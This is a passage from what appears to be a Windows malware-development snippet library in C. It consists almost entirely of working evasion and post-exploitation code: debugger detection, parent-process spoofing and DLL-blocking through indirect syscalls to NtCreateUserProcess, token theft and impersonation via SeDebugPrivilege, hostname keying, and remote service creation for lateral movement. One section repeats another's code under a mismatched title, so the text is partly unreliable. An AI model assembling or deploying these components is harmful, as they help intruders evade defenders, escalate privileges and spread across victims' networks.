  if (pPeb->NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
    return TRUE;

  return FALSE;
}
```
### Custom Pseudo Handles
```c
#include <windows.h>
#define NtCurrentProcess()        ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread()         ((HANDLE)(LONG_PTR)-2)
```
### Check Debug Object Handle Via NtQueryInformationProcess
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL CheckProcessDebugPort() {

    NTSTATUS                      STATUS                        = 0x00;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwProcessDebugPort            = 0x00;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess((HANDLE)-1, ProcessDebugPort, &dwProcessDebugPort, sizeof(DWORD64), NULL)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationProcess [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (dwProcessDebugPort)
        return TRUE;
    else
        return FALSE;
}
```
### Check Debug Port Via NtQueryInformationProcess
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL CheckProcessDebugPort() {

    NTSTATUS                      STATUS                        = 0x00;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwProcessDebugPort            = 0x00;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess((HANDLE)-1, ProcessDebugPort, &dwProcessDebugPort, sizeof(DWORD64), NULL)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationProcess [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (dwProcessDebugPort)
        return TRUE;
    else
        return FALSE;
}
```
### Query CFG Status
```c
#include <windows.h>
#include <stdio.h>
typedef struct _EXTENDED_PROCESS_INFORMATION {
	ULONG ExtendedProcessInfo;
	ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION, * PEXTENDED_PROCESS_INFORMATION;

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL IsCfgEnforced(IN HANDLE hProcess) {

    NTSTATUS                        STATUS                          = 0x00;
    EXTENDED_PROCESS_INFORMATION    ProcInfoEx                      = { 0 };
    fnNtQueryInformationProcess     pNtQueryInformationProcess      = NULL;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    ProcInfoEx.ExtendedProcessInfo          = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer    = 0x00;

    if ((STATUS = pNtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &ProcInfoEx, sizeof(EXTENDED_PROCESS_INFORMATION), NULL)) != 0x00) {
        printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return ProcInfoEx.ExtendedProcessInfoBuffer ? TRUE : FALSE;
}
```
### Process Creation With PPID Spoofing And Block DLL Policy
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtCreateUserProcess_CRC32			0x2B09FF3F

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags
);

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL BlockDllPolicyPlusPPIDSpoofingViaNtCUP(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szProcessParms, IN HANDLE hParentProcess, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	if (!szProcessPath || !szProcessParms || !hParentProcess || !phProcess || !phThread)
		return FALSE;

	BOOL							bResult							= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx	= NULL;
	NTSTATUS						STATUS							= 0x00;
	PPS_ATTRIBUTE_LIST				pAttributeList					= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams				= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcLastSlash					= NULL,
									pszNtProcessPath				= NULL,
									pszFullProcessParm				= NULL;
	UNICODE_STRING					NtImagePath						= { 0 },
									ProcCommandLine					= { 0 },
									ProcCurrentDir					= { 0 };
	PS_CREATE_INFO					PsCreateInfo					= { 0 };
	NT_SYSCALL						NtCreateUserProcess				= { 0 };
	DWORD64                         dw64BlockDllPolicy				= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

	if (!(pRtlCreateProcessParametersEx = GetProcAddress(GetModuleHandleW(TEXT("NTDLL")), "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PS_ATTRIBUTE_LIST) + 3 * sizeof(PS_ATTRIBUTE))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pszNtProcessPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(szProcessPath) * sizeof(WCHAR) + sizeof(L"\\??\\"))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pszFullProcessParm = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ((wcslen(szProcessPath) * sizeof(WCHAR)) + (szProcessParms ? (wcslen(szProcessParms) * sizeof(WCHAR)) : 0x00))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(pszNtProcessPath, L"\\??\\%s", szProcessPath);
	// Append the process parameters to the process path (if exists)
	if (szProcessParms)
		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
	else
		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);


	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength					= sizeof(PS_ATTRIBUTE_LIST) + 3 * sizeof(PS_ATTRIBUTE);
	pAttributeList->Attributes[0].Attribute		= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size			= NtImagePath.Length;
	pAttributeList->Attributes[0].Value			= (ULONG_PTR)NtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute		= PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[1].Size			= sizeof(HANDLE);
	pAttributeList->Attributes[1].Value			= hParentProcess;

	pAttributeList->Attributes[2].Attribute		= PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[2].Size			= sizeof(DWORD64);
	pAttributeList->Attributes[2].Value			= &dw64BlockDllPolicy;

	PsCreateInfo.Size							= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State							= PsCreateInitialState;

	SET_SYSCALL(NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pszNtProcessPath)
		HeapFree(GetProcessHeap(), 0x00, pszNtProcessPath);
	if (pszFullProcessParm)
		HeapFree(GetProcessHeap(), 0x00, pszFullProcessParm);
	return bResult;
}
```
### Retrieve Process Heap
```c
#include <windows.h>
#include <Structs.h>

HANDLE _GetProcessHeap() {

#ifdef _WIN64
	return (HANDLE)((PPEB)__readgsqword(0x60))->ProcessHeap;
#else
	return (HANDLE)((PPEB)__readfsdword(0x30))->ProcessHeap;
#endif
}
```
### Process Creation With PPID Spoofing
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtCreateUserProcess_CRC32			0x2B09FF3F

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags
);

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL PPIDSpoofingViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szProcessParms, IN HANDLE hParentProcess, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	if (!szProcessPath || !hParentProcess || !phProcess || !phThread)
		return FALSE;

	BOOL							bResult							= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx	= NULL;
	NTSTATUS						STATUS							= 0x00;
	PPS_ATTRIBUTE_LIST				pAttributeList					= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams				= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcLastSlash					= NULL,
									pszNtProcessPath				= NULL,
									pszFullProcessParm				= NULL;
	UNICODE_STRING					NtImagePath						= { 0 },
									ProcCommandLine					= { 0 },
									ProcCurrentDir					= { 0 };
	PS_CREATE_INFO					PsCreateInfo					= { 0 };
	NT_SYSCALL						NtCreateUserProcess				= { 0 };

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

	if (!(pRtlCreateProcessParametersEx = GetProcAddress(GetModuleHandleW(TEXT("NTDLL")), "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pszNtProcessPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(szProcessPath) * sizeof(WCHAR) + sizeof(L"\\??\\"))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pszFullProcessParm = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ((wcslen(szProcessPath) * sizeof(WCHAR)) + (szProcessParms ? (wcslen(szProcessParms) * sizeof(WCHAR)) : 0x00))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(pszNtProcessPath, L"\\??\\%s", szProcessPath);
	// Append the process parameters to the process path (if exists)
	if (szProcessParms)
		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
	else
		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);


	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength				= sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size		= NtImagePath.Length;
	pAttributeList->Attributes[0].Value		= (ULONG_PTR)NtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[1].Size		= sizeof(HANDLE);
	pAttributeList->Attributes[1].Value		= hParentProcess;

	PsCreateInfo.Size						= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State						= PsCreateInitialState;

	SET_SYSCALL(NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pszNtProcessPath)
		HeapFree(GetProcessHeap(), 0x00, pszNtProcessPath);
	if (pszFullProcessParm)
		HeapFree(GetProcessHeap(), 0x00, pszFullProcessParm);
	return bResult;
}
```
### Impersonate Process's User
```c
#include <windows.h>
#include <stdio.h>
BOOL SetDebugPrivilege() {

    BOOL	            bResult                 = FALSE;
    TOKEN_PRIVILEGES	TokenPrivs              = { 0x00 };
    LUID				Luid                    = { 0x00 };
    HANDLE	            hCurrentTokenHandle     = NULL;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
        printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    TokenPrivs.PrivilegeCount           = 0x01;
    TokenPrivs.Privileges[0].Luid       = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hCurrentTokenHandle)
        CloseHandle(hCurrentTokenHandle);
    return bResult;
}



BOOL ImpersonateProcess(DWORD dwProcessId) {

    HANDLE  hProcess            = NULL,
            hProcessToken       = NULL,
            hDuplicatedToken    = NULL;
    BOOL    bResult             = FALSE;

    // SeDebugPrivilege must be enabled prior to OpenProcess
    if (!SetDebugPrivilege()) {
        printf("[!] SeDebugPrivilege could not be enabled");
        return FALSE;
    }

    if ((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)) == NULL) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken)) {
        printf("[!] OpenProcessToken Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!DuplicateToken(hProcessToken, SecurityImpersonation, &hDuplicatedToken)) {
        printf("[!] DuplicateToken Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hDuplicatedToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hDuplicatedToken)
        CloseHandle(hDuplicatedToken);
    if (hProcessToken)
        CloseHandle(hProcessToken);
    if (hProcess)
        CloseHandle(hProcess);
    return bResult;
}
```
### Retrieve Current Thread ID
```c
#include <windows.h>
#include <stdio.h>
#include <Structs.h>

DWORD _GetCurrentThreadId() {
#ifdef _WIN64
	return HandleToUlong(((PTEB)__readgsqword(0x30))->ClientId.UniqueThread);
#else
	return HandleToUlong(((PTEB)__readfsdword(0x18))->ClientId.UniqueThread);
#endif
}
```
### Hostname Verification (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL HostCheckW(IN LPCWSTR szHostName) {

    BOOL    bResult             = FALSE;
    LPWSTR  szpHostName         = NULL;
    DWORD   dwHostNameLength    = 0x00;

    if (!szHostName)
        return FALSE;

    if (!GetComputerNameExW(ComputerNameNetBIOS, NULL, &dwHostNameLength) && GetLastError() != ERROR_MORE_DATA) {
        printf("[!] GetComputerNameExW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(szpHostName = LocalAlloc(LPTR, dwHostNameLength * sizeof(WCHAR))))
        goto _END_OF_FUNC;

    if (!GetComputerNameExW(ComputerNameNetBIOS, szpHostName, &dwHostNameLength)) {
        printf("[!] GetComputerNameExW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = (wcscmp(szpHostName, szHostName) == 0x00);

_END_OF_FUNC:
    if (szpHostName)
        LocalFree(szpHostName);
    return bResult;
}
```
### Start Remote Service (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL StartRemoteServiceA(IN LPCSTR cMachineName, IN LPCSTR cServiceName) {

    BOOL        bResult     = FALSE;
    SC_HANDLE   hSCM        = NULL;
    SC_HANDLE   hService    = NULL;

    if ((hSCM = OpenSCManagerA(cMachineName, NULL, SC_MANAGER_CONNECT)) == NULL) {
        printf("[!] OpenSCManagerA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hService = OpenServiceA(hSCM, cServiceName, SERVICE_START)) == NULL) {
        printf("[!] OpenServiceA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
}

    if (!StartServiceA(hService, 0x00, NULL)) {
        printf("[!] StartServiceA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hService)
        CloseServiceHandle(hService);
    if (hSCM)
        CloseServiceHandle(hSCM);
    return bResult;
}
```
### Hostname Verification (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL HostCheckA(IN LPCSTR lpHostName) {

    BOOL    bResult             = FALSE;
    LPSTR   pcHostName          = NULL;
    DWORD   dwHostNameLength    = 0x00;

    if (!lpHostName)
        return FALSE;

    if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dwHostNameLength) && GetLastError() != ERROR_MORE_DATA) {
        printf("[!] GetComputerNameExA [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pcHostName = LocalAlloc(LPTR, dwHostNameLength)))
        goto _END_OF_FUNC;

    if (!GetComputerNameExA(ComputerNameNetBIOS, pcHostName, &dwHostNameLength)) {
        printf("[!] GetComputerNameExA [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = (strcmp(pcHostName, lpHostName) == 0x00);

_END_OF_FUNC:
    if (pcHostName)
        LocalFree(pcHostName);
    return bResult;
}
```
### Start Remote Service (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL StartRemoteServiceW(IN LPCWSTR szMachineName, IN LPCWSTR szServiceName) {

    BOOL        bResult         = FALSE;
    SC_HANDLE   hSCM            = NULL;
    SC_HANDLE   hService        = NULL;

    if ((hSCM = OpenSCManagerW(szMachineName, NULL, SC_MANAGER_CONNECT)) == NULL) {
        printf("[!] OpenSCManagerW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hService = OpenServiceW(hSCM, szServiceName, SERVICE_START)) == NULL) {
        printf("[!] OpenServiceW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!StartServiceW(hService, 0x00, NULL)) {
        printf("[!] StartServiceW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hService)
        CloseServiceHandle(hService);
    if (hSCM)
        CloseServiceHandle(hSCM);
    return bResult;
}
```
### Create And Start Remote Service (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateServiceOnRemoteMachineA(IN LPSTR cMachineName, IN LPSTR cServiceName, IN LPSTR cDisplayName, IN LPSTR cBinaryPath) {

    BOOL        bResult     = FALSE;
    SC_HANDLE   hSCM        = NULL;
    SC_HANDLE   hService    = NULL;

    if ((hSCM = OpenSCManagerA(cMachineName, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL) {
        printf("[!] OpenSCManagerA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hService = CreateServiceA(hSCM, cServiceName, cDisplayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, cBinaryPath, NULL, NULL, NULL, NULL, NULL)) == NULL) {
        printf("[!] CreateServiceA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }


    bResult = TRUE;

_END_OF_FUNC:
    if (hService)
        CloseServiceHandle(hService);
    if (hSCM)
        CloseServiceHandle(hSCM);
    return bResult;
}
```
### Check User's Administrative Status
```c
#include <windows.h>
#include <stdio.h>
BOOL IsUserAdmin() {

    SID_IDENTIFIER_AUTHORITY    NtAuthority             = SECURITY_NT_AUTHORITY;
    PSID                        AdministratorsGroup     = NULL;
    BOOL                        bResult                 = FALSE;

    if (AllocateAndInitializeSid(&NtAuthority, 0x02, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &bResult))
            bResult = FALSE;

        FreeSid(AdministratorsGroup);
    }

    return bResult;
}
```
### Create And Start Remote Service (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateServiceOnRemoteMachineW(IN LPWSTR szMachineName, IN LPWSTR szServiceName, IN LPWSTR szDisplayName, IN LPWSTR szBinaryPath) {

    BOOL        bResult     = FALSE;
    SC_HANDLE   hSCM        = NULL;
    SC_HANDLE   hService    = NULL;

    if ((hSCM = OpenSCManagerW(szMachineName, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL) {
        printf("[!] OpenSCManagerW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if ((hService = CreateServiceW(hSCM, szServiceName, szDisplayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, szBinaryPath, NULL, NULL, NULL, NULL, NULL)) == NULL) {
        printf("[!] CreateServiceW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hService)
        CloseServiceHandle(hService);
    if (hSCM)
        CloseServiceHandle(hSCM);
    return bResult;
}
```
### Process Creation Via NtCreateUserProcess
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtCreateUserProcess_CRC32			0x2B09FF3F

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags
);

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL CreateProcessViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szProcessParms, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	if (!szProcessPath || !phProcess || !phThread)
		return FALSE;

	BOOL							bResult								= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx		= NULL;
	NTSTATUS						STATUS								= 0x00;
	PPS_ATTRIBUTE_LIST				pAttributeList						= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams					= NULL;
	PWCHAR							pwcDuplicateStr						= NULL,
									pwcLastSlash						= NULL,
									pszNtProcessPath					= NULL,
									pszFullProcessParm					= NULL;
	UNICODE_STRING					NtImagePath							= { 0 },
									ProcCommandLine						= { 0 },
									ProcCurrentDir						= { 0 };
	PS_CREATE_INFO					PsCreateInfo						= { 0 };
	NT_SYSCALL						NtCreateUserProcess					= { 0 };


	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

